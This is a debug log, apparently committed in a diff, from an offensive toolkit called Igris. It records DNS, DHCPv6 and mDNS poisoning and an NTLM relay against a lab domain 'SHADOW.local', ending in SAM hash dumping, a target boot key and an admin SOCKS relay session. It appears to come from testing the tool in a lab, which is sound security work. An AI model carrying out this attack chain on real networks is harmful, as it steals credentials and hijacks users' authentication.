+2022-01-19 17:02:30.028 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'wpad.SHADOW.local.'[0m
+2022-01-19 17:02:30.064 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:30.064 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:30.064 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'wpad.shadow.local.'[0m
+2022-01-19 17:02:30.506 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:30.506 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:30.507 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'ctldl.windowsupdate.com.'[0m
+2022-01-19 17:02:31.585 | WARNING  | project.network.mitm.ntlmrelay:__synchronous_attack:165 - Exiting ntlm relay attack ...
+2022-01-19 17:02:32.071 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:32.071 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:32.071 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'g.live.com.'[0m
+2022-01-19 17:02:34.927 | DEBUG    | project.network.mitm.ntlmrelay:do_ntlm_relay:420 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-01-19 17:02:34.928 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:02:34.931 | INFO     | project.network.mitm.ntlmrelay:__wrapper_attack:306 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/loot/192.168.253.138_samhashes.sam 
+2022-01-19 17:02:34.949 | INFO     | project.network.mitm.servers.smbserver:start_smb_relay_server:127 - Setting up SMB Server
+2022-01-19 17:02:34.951 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-19 17:02:35.100 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:35.100 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:35.101 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:02:35.136 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:35.136 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:35.136 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:02:35.168 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:35.168 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:35.168 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:02:42.010 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:42.010 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:42.010 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'cosas.SHADOW.local.'[0m
+2022-01-19 17:02:42.049 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:42.050 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:42.050 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_kerberos._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.LOCAL.'[0m
+2022-01-19 17:02:42.084 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:42.084 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:42.084 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_kerberos._tcp.dc._msdcs.SHADOW.LOCAL.'[0m
+2022-01-19 17:02:45.367 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:45.367 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:45.367 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'cdn.onenote.net.'[0m
+2022-01-19 17:02:45.407 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:45.407 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:45.407 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:02:45.440 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:45.440 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:45.441 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:02:45.472 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:02:45.472 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:02:45.472 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:02:46.066 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-9: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, attacking target smb://192.168.253.138
+2022-01-19 17:02:46.148 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/IRON SUCCEED
+2022-01-19 17:02:46.173 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:156 - No more targets for user SHADOW/IRON
+2022-01-19 17:02:46.174 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-9: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, but there are no more targets left!
+2022-01-19 17:02:46.269 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2022-01-19 17:02:46.309 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is disabled, enabling it
+2022-01-19 17:02:46.334 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2022-01-19 17:02:47.371 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for JD
+2022-01-19 17:02:47.445 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for Skew1
+2022-01-19 17:02:47.473 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for GBG
+2022-01-19 17:02:47.504 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Retrieving class info for Data
+2022-01-19 17:02:47.538 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0x2300995ed1ba51a87969b344c1be1bc9
+2022-01-19 17:02:47.538 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:109 - Saving remote SAM database
+2022-01-19 17:02:47.653 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2022-01-19 17:02:47.654 | DEBUG    | impacket.examples.secretsdump:dump:1217 - Calculating HashedBootKey from SAM
+2022-01-19 17:02:48.080 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
+2022-01-19 17:02:48.219 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
+2022-01-19 17:02:48.357 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
+2022-01-19 17:02:48.501 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
+2022-01-19 17:02:48.647 | DEBUG    | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - NewStyle hashes is: True
+2022-01-19 17:02:48.656 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.138
+2022-01-19 17:02:48.657 | DEBUG    | project.network.mitm.ntlmrelay:__display_sam_alert:71 - The SAM of 192.168.253.138 has been dumped
+2022-01-19 17:02:48.663 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2022-01-19 17:02:48.670 | INFO     | impacket.examples.secretsdump:finish:725 - Restoring the disabled state for service RemoteRegistry
+2022-01-19 17:03:00.350 | DEBUG    | project.network.mitm.ntlmrelay:do_ntlm_relay:420 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-01-19 17:03:00.351 | SUCCESS  | project.network.mitm.ntlmrelay:__ends_ntlm_relay:328 - Finishing ntlm relay attack in the background ...
+2022-01-19 17:03:00.353 | DEBUG    | project.network.mitm.ntlmrelay:__ends_ntlm_relay:336 - Finishing alerts thread ...
+2022-01-19 17:03:02.150 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:02.150 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:02.150 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'login.live.com.'[0m
+2022-01-19 17:03:02.599 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:02.599 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:02.600 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'login.microsoftonline.com.'[0m
+2022-01-19 17:03:05.137 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:05.137 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:05.137 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'arc.msn.com.'[0m
+2022-01-19 17:03:05.374 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:05.374 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:05.374 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'settings-win.data.microsoft.com.'[0m
+2022-01-19 17:03:09.638 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:09.638 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:09.638 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'edge.microsoft.com.'[0m
+2022-01-19 17:03:11.008 | DEBUG    | project.network.mitm.ntlmrelay:do_ntlm_relay:420 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-01-19 17:03:11.008 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:03:11.011 | INFO     | project.network.mitm.ntlmrelay:__wrapper_attack:306 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/loot/192.168.253.138_samhashes.sam 
+2022-01-19 17:03:11.022 | INFO     | project.network.mitm.servers.proxyserver:__init__:11 - Starting socks server ...
+2022-01-19 17:03:11.052 | INFO     | project.network.mitm.servers.smbserver:start_smb_relay_server:127 - Setting up SMB Server
+2022-01-19 17:03:11.055 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2022-01-19 17:03:18.020 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:18.020 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:18.020 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'holaaaaaaaa.SHADOW.local.'[0m
+2022-01-19 17:03:21.368 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-14: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, attacking target smb://192.168.253.138
+2022-01-19 17:03:22.242 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.138 as SHADOW/IRON SUCCEED
+2022-01-19 17:03:22.245 | INFO     | threading:run:892 - SOCKS: Adding SHADOW/IRON@192.168.253.138(445) to active SOCKS connection. Enjoy
+2022-01-19 17:03:22.246 | DEBUG    | threading:run:892 - Checking admin status for user SHADOW/IRON
+2022-01-19 17:03:22.247 | DEBUG    | project.network.mitm.ntlmrelay:__display_connection_alert:85 - [34mℹ[39m New connection captured! Use show_connections(-SC) to see it 
+2022-01-19 17:03:22.248 | DEBUG    | impacket.examples.ntlmrelayx.utils.targetsutils:getTarget:156 - No more targets for user SHADOW/IRON
+2022-01-19 17:03:22.248 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-14: Connection from SHADOW/IRON@::ffff:192.168.253.139 controlled, but there are no more targets left!
+2022-01-19 17:03:22.280 | DEBUG    | threading:run:892 - isAdmin returned: TRUE
+2022-01-19 17:03:32.960 | DEBUG    | project.network.mitm.ntlmrelay:do_ntlm_relay:420 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-01-19 17:03:35.171 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:35.171 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:35.171 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.Default-First-Site-Name._sites.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:03:35.208 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:35.208 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:35.208 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.dc._msdcs.SHADOW.local.'[0m
+2022-01-19 17:03:35.244 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:35.244 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:35.244 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'_ldap._tcp.b05eb74f-ee57-43cd-b537-7a80ccbb0f59.domains._msdcs.SHADOW.local.'[0m
+2022-01-19 17:03:41.055 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - KeepAlive Timer reached. Updating connections
+2022-01-19 17:03:41.055 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - Calling keepAlive() for SHADOW/IRON@192.168.253.138:445
+2022-01-19 17:03:42.959 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:42.959 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:42.959 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'cp601.prod.do.dsp.mp.microsoft.com.'[0m
+2022-01-19 17:03:49.216 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:92 - Packet crafted: 
+2022-01-19 17:03:49.216 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:93 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:03:49.216 | DEBUG    | project.network.poison.poisonengine.poisoners.dns:__send_packet:95 - [36m(DNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d responding b'v20.events.data.microsoft.com.'[0m
+2022-01-19 17:03:50.212 | DEBUG    | project.network.poison.dnstakeover:do_dns_takeover:153 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:03:50.213 | SUCCESS  | project.network.poison.dnstakeover:__end_process_in_the_background:58 - Finishing attack in the background ...
+2022-01-19 17:03:53.649 | DEBUG    | project.network.poison.poisonselector:do_poison:174 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:03:53.649 | SUCCESS  | project.network.poison.poisonselector:__end_process_in_the_background:70 - Finishing attack in the background ...
+2022-01-19 17:04:11.050 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - KeepAlive Timer reached. Updating connections
+2022-01-19 17:04:11.051 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - Calling keepAlive() for SHADOW/IRON@192.168.253.138:445
+2022-01-19 17:04:31.681 | DEBUG    | project.network.poison.dnstakeover:do_dns_takeover:153 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:04:31.681 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:04:31.687 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:220 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-19 17:04:41.046 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - KeepAlive Timer reached. Updating connections
+2022-01-19 17:04:41.047 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - Calling keepAlive() for SHADOW/IRON@192.168.253.138:445
+2022-01-19 17:04:48.459 | DEBUG    | project.network.poison.dnstakeover:do_dns_takeover:153 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:04:48.460 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:04:48.466 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:start_dhcp6_poisoning:220 - Starting dhcp6 rogue to attack shadow.local.
+2022-01-19 17:05:11.046 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - KeepAlive Timer reached. Updating connections
+2022-01-19 17:05:11.047 | DEBUG    | impacket.examples.ntlmrelayx.servers.socksserver:_run:128 - Calling keepAlive() for SHADOW/IRON@192.168.253.138:445
+2022-01-19 17:05:19.472 | INFO     | project.network.poison.poisonengine.poisoners.dhcp6:__application_layer:141 - [36m(DHCP6)Capturing SOLICIT packet from fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:05:32.447 | DEBUG    | project.network.mitm.ntlmrelay:ntlm_relay_postloop:349 - Finishing ntlm_relay process ...
+2022-01-19 17:05:32.451 | DEBUG    | project.network.mitm.ntlmrelay:ntlm_relay_postloop:354 - Finishing alerts thread ...
+2022-01-19 17:09:44.241 | DEBUG    | project.network.poison.dnstakeover:do_dns_takeover:159 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:10:37.306 | DEBUG    | project.network.poison.dnstakeover:do_dns_takeover:159 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:10:37.306 | ERROR    | project.network.poison.dnstakeover:__checking_conditions_for_attack:89 - Mask invalid
+2022-01-19 17:12:05.087 | DEBUG    | project.network.poison.poisonselector:do_poison:174 - Starting mdns poisoning attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-01-19 17:12:05.088 | DEBUG    | project.shell.igris:check_settable_variables_value:231 - Checking the correct value of the necessary settable variables 
+2022-01-19 17:12:05.106 | INFO     | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:134 - Starting mdns poisoning...
+2022-01-19 17:15:48.055 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:48.056 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:48.056 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to 192.168.253.139[0m
+2022-01-19 17:15:48.092 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:48.093 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:48.093 | INFO     | project.network.poison.poisonengine.poisoners.mdns:__send_packet:94 - [36m(MDNS) Sending packet to fe80::ad5d:a0a0:f1d:bb1d[0m
+2022-01-19 17:15:52.383 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.383 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:52.384 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.384 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:52.607 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.607 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:52.608 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.609 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:52.680 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.680 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:52.681 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.681 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:52.682 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.682 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:52.683 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:52.683 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:53.443 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:53.443 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:53.444 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:53.444 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:53.625 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:53.625 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-01-19 17:15:53.626 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:91 - Packet crafted: 
+2022-01-19 17:15:53.626 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:92 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
